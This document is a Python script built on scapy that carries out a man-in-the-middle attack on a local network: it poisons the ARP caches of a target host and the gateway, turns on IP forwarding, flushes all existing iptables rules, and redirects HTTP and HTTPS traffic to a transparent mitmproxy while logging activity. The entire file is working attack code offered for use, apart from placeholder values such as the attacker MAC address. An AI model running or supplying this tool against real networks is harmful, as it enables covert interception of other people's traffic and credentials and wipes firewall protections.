from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR
import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "wlo1"
gateway_ip = "10.0.0.1"
target_ip = "10.0.0.2"  # Fixed invalid IP "1" to a plausible LAN IP
attacker_mac = "myMAc"  # Replace with your actual MAC address (e.g., "00:11:22:33:44:55")
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now()
        f.write(f"[{timestamp}] {message}\n")

# ARP Spoofing function
def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=spoof_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Restoring {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)

def get_mac(ip):
    arp_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None

# Continuous spoofing
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        msg = "Spoofing stopped by user."
        print(msg)
        log_to_file(msg)
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print(msg)
        log_to_file(msg)

def start_mitmproxy():
    msg = f"mitmproxy: {mitmproxy_port} is running"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(
        ["mitmproxy", "--mode", "transparent", "--listen-port", str(mitmproxy_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_process

def setup_iptables():
    msg = "Setting up iptables for traffic redirection..."
    print(msg)
    log_to_file(msg)
    try:
        # Enable IP forwarding
        os.system("sysctl -w net.ipv4.ip_forward=1")
        
        # Flush existing iptables rules
        os.system("iptables -F")
        os.system("iptables -t nat -F")
        
        # Redirect traffic to mitmproxy port
        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")
        
        # Allow forwarded traffic
        os.system(f"iptables -A FORWARD -i {interface} -j ACCEPT")
        
        msg = "iptables setup complete."
        print(msg)
        log_to_file(msg)
    except Exception as e:
        msg = f"iptables setup error: {e}"
        print(msg)
        log_to_file(msg)

def main():
    # Get MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        msg = "Failed to get MAC addresses. Check IPs and network."
        print(msg)
        log_to_file(msg)
        sys.exit(1)

    msg = f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}"
    print(msg)
    log_to_file(msg)

    # Setup iptables for traffic redirection
    setup_iptables()

    # Start mitmproxy in a separate thread
    mitmproxy_thread = threading.Thread(target=start_mitmproxy)
    mitmproxy_thread.daemon = True
    mitmproxy_thread.start()

    # Start ARP spoofing
    msg = "Starting ARP spoofing..."
    print(msg)
    log_to_file(msg)
    start_spoofing(target_mac, gateway_mac)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        msg = "MITM attack stopped by user."
        print(msg)
        log_to_file(msg)
        # Cleanup iptables
        os.system("iptables -F")
        os.system("iptables -t nat -F")
        os.system("sysctl -w net.ipv4.ip_forward=0")